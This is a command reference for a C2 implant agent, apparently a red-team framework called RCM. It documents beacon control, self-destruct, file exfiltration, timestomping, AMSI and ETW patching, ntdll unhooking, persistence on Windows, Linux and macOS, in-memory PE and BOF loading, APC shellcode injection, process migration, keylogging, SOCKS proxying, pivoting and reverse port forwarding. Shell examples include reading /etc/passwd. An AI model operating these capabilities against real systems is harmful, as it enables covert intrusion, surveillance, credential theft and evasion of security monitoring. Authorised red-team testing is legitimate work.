# Command Reference

All commands are sent to the agent via the terminal or API. Commands must match
the router table below exactly. Unrecognized commands are **not** passed to the
shell: the agent replies `Unknown command: '<cmd>'. Use 'shell <cmd>' or
'!<cmd>' for OS shell execution.` and exit code 1. Use the explicit `shell` or
`!` prefix for OS commands (see the Shell section).

Availability column: `Win` / `Lin` / `Mac`. Commands marked "Win" return an
error on other platforms (e.g. `evasion:encrypt_heap_aes` -> "Heap encryption
is Windows-only", `inmem:bof` -> "BOF execution is Windows-only"). The router
itself lives in `src/agent/handlers/mod.rs`.

## Session Control

| Command | OS | Description |
|---------|----|-------------|
| `sleep <secs> <jitter_min_ms> <jitter_max_ms>` | All | Set beacon interval (seconds) and jitter range (milliseconds; jitter_min <= jitter_max) |
| `beacon:mode active` | All | Switch to fast mode (100ms polling) |
| `beacon:mode passive` | All | Switch back to normal sleep interval |
| `sys:die` | All | Self-destruct: delete binary and exit |
| `exit` | All | Clean exit without self-destruct (intercepted before the router) |
| `fallback:config` | All | Show configured fallback endpoints and DGA status |
| `fallback:push\|<json>` | All | Replace the running fallback endpoint set with a new positional-JSON config (see [Fallback & DGA](fallback.md)) |

## File Operations

| Command | OS | Description |
|---------|----|-------------|
| `file:read\|<path>` | All | Download a file (base64 encoded; files >= 50 MB switch to chunked transfer automatically) |
| `file:write\|<path>\|<base64>` | All | Upload a file |
| `file:write_chunk\|<batch_ts>\|<path>\|<idx>\|<total>\|<b64>` | All | Upload one chunk of a large file (emitted by the API upload endpoint, not normally typed by hand) |
| `file:read_recursive\|<path>` | All | Download an entire directory tree |
| `fs:ls <path>` | All | List directory contents (JSON) |

## Artifact Management

| Command | OS | Description |
|---------|----|-------------|
| `timestomp <target> <reference>` | All | Copy timestamps from reference to target |
| `timestomp:set <path> <epoch>` | All | Set timestamps to Unix epoch value |
| `secure_delete <path>` | All | 4-pass overwrite + delete |
| `ads:write <path> <stream> <b64>` | Win | Write to NTFS Alternate Data Stream |
| `ads:read <path> <stream>` | Win | Read from ADS (returns base64) |
| `ads:list <path>` | Win | List all ADS on a file |

## Job System

| Command | OS | Description |
|---------|----|-------------|
| `bg <command>` | All | Run shell command as background job |
| `jobs:list` | All | List all jobs with status |
| `jobs:kill <id>` | All | Abort a running job |
| `jobs:purge` | All | Remove finished jobs from the list |

## Evasion

| Command | OS | Description |
|---------|----|-------------|
| `evasion:patch_amsi` | Win | Patch AmsiScanBuffer -> return E_INVALIDARG |
| `evasion:patch_etw` | Win | Patch EtwEventWrite -> return STATUS_SUCCESS |
| `evasion:unhook_ntdll` | Win | Replace hooked ntdll .text with clean copy from disk |
| `evasion:patch_all` | Win | Run all three patches in sequence |
| `evasion:syscall_check` | Win | Resolve and display syscall numbers + gadget address |
| `evasion:encrypt_heap_aes` | Win | AES-256-GCM encrypt the process heap on demand; stores the key for the paired decrypt (see [Evasion](evasion.md)) |
| `evasion:decrypt_heap_aes` | Win | Decrypt the heap with the stored key |

## Persistence

Native `persist:*` handlers backed by direct OS API calls. Every install
command has a matching `_remove` variant with the same argument shape. Full
per-technique detail and OPSEC notes: [Persistence](persistence.md).

| Command | OS | Description |
|---------|----|-------------|
| `persist:list` | All | Enumerate installed RCM persistence entries |
| `persist:cleanup` | All | Remove every RCM-installed persistence entry |
| `persist:run <name> <path>` | Win | HKCU Run key |
| `persist:run_remove <name>` | Win | Remove HKCU Run value |
| `persist:run_hklm <name> <path>` | Win | HKLM Run key (admin) |
| `persist:run_hklm_remove <name>` | Win | Remove HKLM Run value |
| `persist:task <name> <path>` | Win | Scheduled task via COM `ITaskService` |
| `persist:task_remove <name>` | Win | Remove scheduled task |
| `persist:startup <filename> <path>` | Win | Copy into user Startup folder |
| `persist:startup_remove <filename>` | Win | Remove from Startup folder |
| `persist:systemd <name> <path>` | Lin | User systemd unit (`~/.config/systemd/user/`) |
| `persist:systemd_remove <name>` | Lin | Remove systemd unit |
| `persist:profile <path>` | Lin | Guarded launch block in `~/.bashrc` / `~/.profile` |
| `persist:profile_remove <path>` | Lin | Remove profile block |
| `persist:cron <path>` | Lin, Mac | `@reboot` crontab entry |
| `persist:cron_remove <path>` | Lin, Mac | Remove crontab entry |
| `persist:launchagent <label> <path>` | Mac | `~/Library/LaunchAgents` plist |
| `persist:launchagent_remove <label>` | Mac | Remove LaunchAgent plist |

## In-Memory Execution

| Command | OS | Description |
|---------|----|-------------|
| `inmem:pe <base64>` | Win | Load and execute a PE (EXE or DLL) in memory |
| `inmem:bof <b64_coff> [b64_args]` | Win | Run a Beacon Object File |
| `inmem:dotnet <path> <Type> <Method> <arg> [runtime]` | Win | Execute a .NET assembly via CLR hosting. Note: the CLR API takes an on-disk path, so the assembly is executed from a file, not from a byte array in memory |
| `ext:load <base64_script> [args...]` | All | Run a Rhai extension script (as background job) |

## Process Operations

| Command | OS | Description |
|---------|----|-------------|
| `proc:inject <pid> <base64_shellcode>` | Win | Inject shellcode via remote APC |
| `migrate:spawn <binary>` | Win | Spawn process and migrate agent into it |
| `migrate:inject <pid>` | Win | Migrate agent into existing process |

## Keylogger

| Command | OS | Description |
|---------|----|-------------|
| `keylogger:start` | Win | Start keystroke/clipboard/screenshot capture (replies "Not supported" on Linux/macOS) |
| `keylogger:stop` | Win | Stop capture |
| `keylogger:dump` | Win | Retrieve and download captured data |

## Network

| Command | OS | Description |
|---------|----|-------------|
| `proxy:start <port>` | All | Start SOCKS5 proxy tunnel |
| `proxy:stop` | All | Stop SOCKS5 proxy |
| `pivot:listener_tcp <port>` | All | Start TCP pivot listener for child agents |
| `pivot:listener_smb <pipe_name>` | Win | Start named pipe pivot listener (errors on non-Windows) |
| `pivot:list` | All | List active pivot listeners |
| `pivot:stop <listener_id>` | All | Stop a pivot listener |
| `rportfwd:start <tunnel_port> <host> <port>` | All | Start reverse port forward (agent connects tunnel, forwards to host:port) |
| `rportfwd:stop <tunnel_port>` | All | Stop a reverse port forward by tunnel port |
| `rportfwd:list` | All | List all active reverse port forwards |

### Reverse Port Forwarding (API)

Reverse port forwarding is typically managed via the API rather than raw commands:

| Method | Endpoint | Body | Description |
|--------|----------|------|-------------|
| `POST` | `/api/hosts/:id/rportfwd` | `{"bind_port": 8888, "target_host": "10.1.1.5", "target_port": 3389}` | Bind port 8888 on the team server, tunnel through the agent to 10.1.1.5:3389 |
| `DELETE` | `/api/hosts/:id/rportfwd` | `{"bind_port": 8888}` | Stop the reverse port forward |
| `GET` | `/api/rportfwds` | - | List all active reverse port forwards |

## Topology

The topology planner runs on the server using network interface data already reported by agents at check-in. No probe traffic is sent.

| Method | Endpoint | Description |
|--------|----------|-------------|
| `GET` | `/api/topology/plan?target=<ip_or_cidr>` | Rank connected sessions as pivot candidates toward a target IP or CIDR. Returns candidates sorted by score with a rendered text plan. |
| `GET` | `/api/topology/snapshot` | Full cross-session interface map: all non-loopback routes, shared subnets, and conflicts. |

Example:
```bash
curl -s -H "X-API-KEY: $KEY" \
  "http://server:8080/api/topology/plan?target=10.10.5.0/24"
```
```json
{
  "target": "10.10.5.0/24",
  "rendered": "✔  Session #3 (agent-tls) via eth0 10.10.5.22/24 [score 85]\n Session #1 (agent-http) via eth1 10.10.0.5/24 [score 42]",
  "candidates": [
    {"session_id": 3, "hostname": "agent-tls", "interface": "eth0",
     "address": "10.10.5.22/24", "score": 85},
    {"session_id": 1, "hostname": "agent-http", "interface": "eth1",
     "address": "10.10.0.5/24", "score": 42}
  ]
}
```

## Shell

OS commands require an explicit prefix:

```
shell whoami /all
!cat /etc/passwd
```

`shell <cmd>` runs `sh -c` on Linux/macOS and `powershell -NoProfile -Command`
on Windows. `!<cmd>` is a shorthand for the same handler. A bare command that
matches no router entry returns the `Unknown command` error - nothing is
executed.
